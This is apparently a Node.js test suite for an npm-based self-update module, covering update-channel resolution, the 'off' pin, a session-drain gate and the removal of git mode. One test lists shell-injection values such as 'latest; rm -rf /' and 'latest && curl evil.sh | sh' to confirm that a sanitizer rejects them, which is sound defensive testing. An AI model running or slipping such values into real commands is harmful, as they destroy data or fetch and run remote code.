// Self-update tests. npm is the ONLY distribution channel — the manager never
// fetches/checks-out/builds from a git remote to update itself. The retired
// 'git' install mode (and its adoptRemoteBranch / detectRepoRoot /
// computeGitUpdateState machinery, plus the separate git-mode-update suite) was
// removed; what remains to prove here is:
//   - install-mode classification collapses to npm-global vs unknown;
//   - the update channel resolves safely (including the injection guard) and
//     reaches UpdateStatus;
//   - channel 'off' pins the build — no checker, no self-update;
//   - the embedded npm-global updater helper still parses.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { promises as fsp } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { execFileSync } from 'node:child_process';

import {
  classifyInstallMode,
  detectInstallMode,
  resolveUpdateChannel,
  isAutoUpdateDisabled,
  compareSemver,
  runSelfUpdate,
  restartManager,
  _resetSelfUpdateInFlightForTests,
  UPDATE_CHANNEL_ENV,
  UPDATE_CHANNEL_OFF,
  SELF_UPDATE_DRAIN_MAX_WAIT_MS,
  UpdateChecker,
  evaluateNpmUpdateGate,
  hasPendingSelfUpdate,
  _npmGlobalUpdaterSourceForTests,
  pendingRestartReason,
  _setPendingRestartReasonForTests,
} from '../dist/lib/self-update.js';

// ─── install mode ───────────────────────────────────────────────────────────
// Reachable npm → npm-global (auto-updatable via `npm i -g`); no npm → unknown
// (manual upgrade only). classifyInstallMode is the pure core, so the decision
// is testable without spawning npm; detectInstallMode wires the real probe.

test('classifyInstallMode: reachable npm → npm-global', () => {
  assert.equal(classifyInstallMode('/usr/lib/node_modules'), 'npm-global');
  // A locally-packed tarball installed to a custom prefix is still npm-managed.
  assert.equal(classifyInstallMode('/home/me/.npm-global/lib/node_modules'), 'npm-global');
});

test('classifyInstallMode: no npm → unknown (manual upgrade only)', () => {
  assert.equal(classifyInstallMode(null), 'unknown');
});

test('detectInstallMode: this checkout resolves npm-global (npm is on PATH in CI)', () => {
  assert.equal(detectInstallMode(), 'npm-global');
});

// ─── update channel ─────────────────────────────────────────────────────────

test('resolveUpdateChannel: defaults to latest', () => {
  assert.equal(resolveUpdateChannel(''), 'latest');
  assert.equal(resolveUpdateChannel(null), 'latest');
  assert.equal(resolveUpdateChannel('   '), 'latest');
});

test('resolveUpdateChannel: accepts dist-tags and exact versions', () => {
  assert.equal(resolveUpdateChannel('next'), 'next');
  assert.equal(resolveUpdateChannel('beta'), 'beta');
  assert.equal(resolveUpdateChannel('1.6.99'), '1.6.99');
  assert.equal(resolveUpdateChannel('1.7.0-rc.1'), '1.7.0-rc.1');
  assert.equal(resolveUpdateChannel('  next  '), 'next', 'surrounding whitespace is trimmed');
});

test('resolveUpdateChannel: off is recognized case-insensitively', () => {
  assert.equal(resolveUpdateChannel('off'), UPDATE_CHANNEL_OFF);
  assert.equal(resolveUpdateChannel('OFF'), UPDATE_CHANNEL_OFF);
  assert.equal(isAutoUpdateDisabled(resolveUpdateChannel('off')), true);
  assert.equal(isAutoUpdateDisabled(resolveUpdateChannel('latest')), false);
});

// The channel is interpolated into an `npm view` / `npm install -g` spec that
// runs with shell:true on Windows, so a hostile env value must never survive
// into the command. Anything outside the npm dist-tag/version charset falls
// back to the default channel rather than being passed through.
test('resolveUpdateChannel: rejects shell/argument injection attempts', () => {
  for (const evil of [
    'latest; rm -rf /',
    'latest && curl evil.sh | sh',
    'latest`whoami`',
    'latest $(id)',
    '--registry=https://evil.example',
    '../../etc/passwd',
    'latest\nnpm i -g evil',
    'latest evil-package',
    '@scope/evil',
    '-latest',
  ]) {
    assert.equal(resolveUpdateChannel(evil), 'latest', `must not pass through: ${JSON.stringify(evil)}`);
  }
});

test('UpdateChecker: channel reaches UpdateStatus and defaults to latest', () => {
  const c = new UpdateChecker({ log: () => {} });
  const s = c.status();
  assert.equal(s.install_mode, 'npm-global');
  assert.equal(s.update_channel, 'latest');
  assert.equal(typeof s.current_version, 'string');
  assert.notEqual(s.current_version, '0.0.0', 'the bundled version resolves from dist/package.json');
  // The retired git-mode fields must be gone from the wire contract.
  assert.equal('repo_root' in s, false);
  assert.equal('branch' in s, false);
  c.stop();
});

test('UpdateChecker: an explicit channel is carried through', () => {
  const c = new UpdateChecker({ log: () => {}, updateChannel: 'next' });
  assert.equal(c.status().update_channel, 'next');
  c.stop();
});

test('UpdateChecker: channel=off disables the poll loop entirely', () => {
  const logs = [];
  const c = new UpdateChecker({
    log: (m) => logs.push(m),
    updateChannel: UPDATE_CHANNEL_OFF,
    installMode: 'npm-global',
  });
  c.start();
  assert.match(logs.join('\n'), /auto-update disabled/i);
  // start() must not have armed a timer — a pinned build never polls the
  // registry, so the status stays exactly as constructed.
  const s = c.status();
  assert.equal(s.update_available, false);
  assert.equal(s.latest_version, null);
  assert.equal(s.last_checked_at, null);
  c.stop();
});

test('UpdateChecker: install_mode=unknown disables the poll loop', () => {
  const logs = [];
  const c = new UpdateChecker({ log: (m) => logs.push(m), installMode: 'unknown' });
  c.start();
  assert.match(logs.join('\n'), /npm is not reachable/i);
  assert.equal(c.status().last_checked_at, null);
  c.stop();
});

// ─── self-update entry point ────────────────────────────────────────────────

test('runSelfUpdate: channel=off refuses to touch the install', async () => {
  const prev = process.env[UPDATE_CHANNEL_ENV];
  process.env[UPDATE_CHANNEL_ENV] = UPDATE_CHANNEL_OFF;
  _resetSelfUpdateInFlightForTests();
  try {
    const logs = [];
    const r = await runSelfUpdate({ log: (m) => logs.push(m), noReExec: true });
    assert.equal(r.changed, false);
    assert.match(r.summary, /pins this build/);
    assert.equal(r.willReExec, undefined);
    // Nothing resembling an install may have been attempted.
    assert.doesNotMatch(logs.join('\n'), /npm install -g/);
  } finally {
    if (prev === undefined) delete process.env[UPDATE_CHANNEL_ENV];
    else process.env[UPDATE_CHANNEL_ENV] = prev;
    _resetSelfUpdateInFlightForTests();
  }
});

// ticket b831b896: a self-update restart used to SIGTERM every in-flight
// chat/action/QA/ticket-dispatch session unconditionally — a session that
// had started 13 seconds earlier died mid-run and its failure got recorded
// with a guessed cause.
//
// Round 1 fixed that by blocking runSelfUpdate in-call until
// countInFlightSessions() drained. Review round 2 found that blocking wait
// itself was a regression: it ran BEFORE checking whether an update was
// even needed (channel off / already latest paid the full wait for
// nothing), it held the module-level self-update mutex for its whole
// duration (silently no-op'ing a concurrent operator restart_manager), and
// — because the drain cap and the server's command-ledger RECORD_TTL_MS are
// both exactly 10 minutes — the SSE update_manager ack for any run that hit
// the cap arrived after the ledger entry expired and got rejected 410, even
// though the update itself went on to succeed.
//
// Round 2: the drain check moved to AFTER channel/npm-reachable/provenance/
// already-latest are resolved (so it only ever runs when an install is
// definitely about to happen), and it no longer blocks — a non-zero count
// returns `deferred:true` immediately and UpdateChecker's periodic tick
// retries automatically, tracking the wall-clock cap across those retries
// via _deferredSince. evaluateNpmUpdateGate is the synchronous, pure
// decision function this all reduces to — test it directly rather than the
// full pipeline, which needs a real npm registry round-trip to even reach
// it (see the channel=off note in the file header).

test('compareSemver: equal versions → 0 (drives the already-latest skip)', () => {
  assert.equal(compareSemver('1.6.154', '1.6.154'), 0);
});

test('compareSemver: registry ahead of current → >0 (update needed)', () => {
  assert.ok(compareSemver('1.6.155', '1.6.154') > 0);
});

test('compareSemver: current ahead of registry (local/dev build) → <0 (no update)', () => {
  assert.ok(compareSemver('1.6.100', '1.6.154') < 0);
});

test('evaluateNpmUpdateGate: countInFlightSessions not wired → proceeds, no summary', () => {
  const r = evaluateNpmUpdateGate({ countInFlightSessions: null, deferredSinceMs: null, nowMs: 1000, capMs: 60_000 });
  assert.deepEqual(r, { proceed: true, deferred: false, nextDeferredSinceMs: null, summary: null });
});

test('evaluateNpmUpdateGate: zero sessions, no prior deferral → proceeds silently', () => {
  const r = evaluateNpmUpdateGate({ countInFlightSessions: 0, deferredSinceMs: null, nowMs: 1000, capMs: 60_000 });
  assert.deepEqual(r, { proceed: true, deferred: false, nextDeferredSinceMs: null, summary: null });
});

test('evaluateNpmUpdateGate: zero sessions AFTER a prior deferral → proceeds with a "drained" summary', () => {
  const r = evaluateNpmUpdateGate({ countInFlightSessions: 0, deferredSinceMs: 500, nowMs: 1000, capMs: 60_000 });
  assert.equal(r.proceed, true);
  assert.equal(r.nextDeferredSinceMs, null);
  assert.match(r.summary, /drained — proceeding/);
});

test('evaluateNpmUpdateGate: sessions present, first check → defers and starts the clock at nowMs', () => {
  const r = evaluateNpmUpdateGate({ countInFlightSessions: 3, deferredSinceMs: null, nowMs: 10_000, capMs: 60_000 });
  assert.equal(r.proceed, false);
  assert.equal(r.deferred, true);
  assert.equal(r.nextDeferredSinceMs, 10_000);
  assert.match(r.summary, /3 in-flight session/);
  assert.match(r.summary, /will retry automatically/);
});

test('evaluateNpmUpdateGate: continuing streak within cap → keeps the ORIGINAL since timestamp', () => {
  const r = evaluateNpmUpdateGate({ countInFlightSessions: 1, deferredSinceMs: 10_000, nowMs: 40_000, capMs: 60_000 });
  assert.equal(r.proceed, false);
  assert.equal(r.deferred, true);
  assert.equal(r.nextDeferredSinceMs, 10_000, 'a retry must not reset the clock — the cap tracks the whole streak');
  assert.match(r.summary, /deferred 30s so far/);
});

test('evaluateNpmUpdateGate: streak exceeds the cap → forces through (proceed, clock cleared)', () => {
  const capMs = SELF_UPDATE_DRAIN_MAX_WAIT_MS;
  const r = evaluateNpmUpdateGate({ countInFlightSessions: 5, deferredSinceMs: 10_000, nowMs: 10_000 + capMs + 1, capMs });
  assert.equal(r.proceed, true);
  assert.equal(r.deferred, false);
  assert.equal(r.nextDeferredSinceMs, null);
  assert.match(r.summary, /cap .*exceeded — proceeding with 5 session/);
});

test('_resetSelfUpdateInFlightForTests clears hasPendingSelfUpdate too', () => {
  _resetSelfUpdateInFlightForTests();
  assert.equal(hasPendingSelfUpdate(), false);
});

// ─── runSelfUpdate / restartManager integration (round 2) ──────────────────
// channel=off is the one path exercisable without a real npm registry call
// (see the file header) — used here as a fast, deterministic proxy to prove
// properties of the NEW code that hold regardless of which early-return
// fires: no blocking sleep survives anywhere in the call, and the
// self-update mutex is released promptly enough that a concurrent operator
// restart_manager is never silently swallowed.

test('runSelfUpdate: channel=off never even calls countInFlightSessions (drain check is downstream of it)', async () => {
  const prev = process.env[UPDATE_CHANNEL_ENV];
  process.env[UPDATE_CHANNEL_ENV] = UPDATE_CHANNEL_OFF;
  _resetSelfUpdateInFlightForTests();
  try {
    let calls = 0;
    const r = await runSelfUpdate({
      log: () => {},
      noReExec: true,
      countInFlightSessions: () => {
        calls += 1;
        return 3;
      },
    });
    assert.equal(calls, 0, 'an update that is off/refused must never cost a session-drain check');
    assert.equal(r.changed, false);
    assert.equal(r.deferred, undefined);
    assert.equal(hasPendingSelfUpdate(), false);
  } finally {
    if (prev === undefined) delete process.env[UPDATE_CHANNEL_ENV];
    else process.env[UPDATE_CHANNEL_ENV] = prev;
    _resetSelfUpdateInFlightForTests();
  }
});

test('runSelfUpdate: resolves near-instantly on a short-circuit path (no reintroduced blocking sleep)', async () => {
  const prev = process.env[UPDATE_CHANNEL_ENV];
  process.env[UPDATE_CHANNEL_ENV] = UPDATE_CHANNEL_OFF;
  _resetSelfUpdateInFlightForTests();
  try {
    const startedAt = Date.now();
    await runSelfUpdate({ log: () => {}, noReExec: true, countInFlightSessions: () => 5 });
    const elapsedMs = Date.now() - startedAt;
    assert.ok(
      elapsedMs < 2_000,
      `expected a near-instant return, took ${elapsedMs}ms — a blocking wait may have been reintroduced`,
    );
  } finally {
    if (prev === undefined) delete process.env[UPDATE_CHANNEL_ENV];
    else process.env[UPDATE_CHANNEL_ENV] = prev;
    _resetSelfUpdateInFlightForTests();
  }
});

test('runSelfUpdate: self-update mutex releases promptly — a following restart_manager is not silently swallowed', async () => {
  // Reviewer requirement: "drain 중 operator restart_manager 정책이 명시적으로
  // 동작함(최소 무음 skip 금지)". The exact deferred branch needs a real npm
  // registry round-trip to reach (see file header), so this exercises the
  // general release contract instead: EVERY runSelfUpdate() outcome goes
  // through the same finally{} that releases selfUpdateInFlight unless a
  // re-exec was actually scheduled (it wasn't here — channel=off never gets
  // that far) — so a restart_manager issued right after must never see
  // stale contention from a call that already returned.
  const prev = process.env[UPDATE_CHANNEL_ENV];
  process.env[UPDATE_CHANNEL_ENV] = UPDATE_CHANNEL_OFF;
  _resetSelfUpdateInFlightForTests();
  try {
    await runSelfUpdate({ log: () => {}, noReExec: true });
    const logs = [];
    const r = await restartManager({ log: (m) => logs.push(m), noReExec: true });
    assert.doesNotMatch(
      logs.join('\n'),
      /already in flight/,
      'restart_manager must not be skipped because a prior self-update attempt left the mutex held',
    );
    assert.equal(r.changed, true, 'restart_manager should proceed normally once the prior call has resolved');
  } finally {
    if (prev === undefined) delete process.env[UPDATE_CHANNEL_ENV];
    else process.env[UPDATE_CHANNEL_ENV] = prev;
    _resetSelfUpdateInFlightForTests();
  }
});

test('embedded npm-global updater helper source is valid ESM (node --check)', async () => {
  const src = _npmGlobalUpdaterSourceForTests();
  assert.match(src, /npm.*install.*-g/s, 'helper must run `npm install -g`');
  const dir = await fsp.mkdtemp(join(tmpdir(), 'awb-helper-'));
  try {
    const f = join(dir, 'updater.mjs');
    await fsp.writeFile(f, src);
    // `node --check` parses (does not execute) — throws on any syntax error,
    // guarding the embedded string against silent rot.
    execFileSync('node', ['--check', f], { encoding: 'utf8' });
  } finally {
    await fsp.rm(dir, { recursive: true, force: true });
  }
});

// ─── git-mode removal regression ────────────────────────────────────────────
// The whole point of the removal: no self-update code path may shell out to git
// again. This asserts the compiled surface, so a future re-introduction fails
// here rather than silently shipping a second distribution channel.
test('compiled self-update carries no git invocation', async () => {
  const src = await fsp.readFile(new URL('../dist/lib/self-update.js', import.meta.url), 'utf8');
  assert.doesNotMatch(src, /'git'/, "self-update must not spawn git");
  assert.doesNotMatch(src, /checkout --detach|rev-parse|origin\//, 'no git plumbing may remain');
});

test('retired git-mode exports are gone', async () => {
  const mod = await import('../dist/lib/self-update.js');
  for (const name of ['adoptRemoteBranch', 'detectRepoRoot', 'computeGitUpdateState']) {
    assert.equal(mod[name], undefined, `${name} must not be exported anymore`);
  }
});

// ─── pendingRestartReason (ticket b831b896 / 6abe2b79 rebase 통합) ──────────
// runNpmGlobalSelfUpdate()의 실제 성공 경로(npm install -g 성공 → 자가 SIGTERM
// 예약)는 이 스위트 어디에서도 실제로 구동하지 않는다(진짜 npm install + 자가
// 종료를 유닛 테스트에서 트리거하는 건 너무 위험하다 — 같은 이유로 이미
// `isSystemdReExecPending`/`_systemdReExecPending`의 세팅 지점도 이 파일에서
// 테스트되지 않는다). 그 두 self-update 재시작 호출부(POSIX reExecManager,
// Windows shutdownForNpmGlobalUpdate)에 `_pendingRestartReason = 'self_update_restart'`
// 한 줄을 심은 배치 자체는 코드 리뷰로 검증한다 — 여기서는 그 값을 읽는
// getter(pendingRestartReason)의 계약만 테스트 전용 setter로 증명한다(ticket
// b831b896 이 이 getter 를 도입했지만 직접 검증하는 테스트는 없었다 — ticket
// 6abe2b79 의 main.ts 통합에서 SubagentManager.stop() 이 이 값에 의존하므로
// 여기서 커버한다).
test('pendingRestartReason: 기본값은 null (self-update 재시작 예약 없음)', () => {
  _setPendingRestartReasonForTests(null);
  assert.equal(pendingRestartReason(), null);
});

test('pendingRestartReason: self-update 재시작이 예약되면 self_update_restart 를 반환한다', () => {
  _setPendingRestartReasonForTests('self_update_restart');
  try {
    assert.equal(pendingRestartReason(), 'self_update_restart');
  } finally {
    _setPendingRestartReasonForTests(null); // 다른 테스트로 새지 않도록 원복
  }
});
